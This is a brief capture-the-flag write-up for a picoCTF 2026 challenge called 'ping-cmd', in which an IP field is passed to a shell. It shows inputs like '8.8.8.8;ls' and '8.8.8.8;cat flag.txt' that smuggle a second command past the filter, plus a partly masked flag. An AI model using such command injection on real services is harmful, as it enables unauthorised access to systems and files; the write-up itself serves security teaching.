# ping-cmd — picoCTF 2026

Hints:
- Hint 1: The program uses a shell command behind the scenes.
- Hint 2: Sometimes you can run more than one command at a time.

Connect to the challenge:

    nc mysterious-sea.picoctf.net 55983
    Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8

Test simple command injection by appending a second command:

    nc mysterious-sea.picoctf.net 55983
    Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;ls
    flag.txt
    script.sh

Read the flag:

    nc mysterious-sea.picoctf.net 55983
    Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;cat flag.txt
    picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_********}
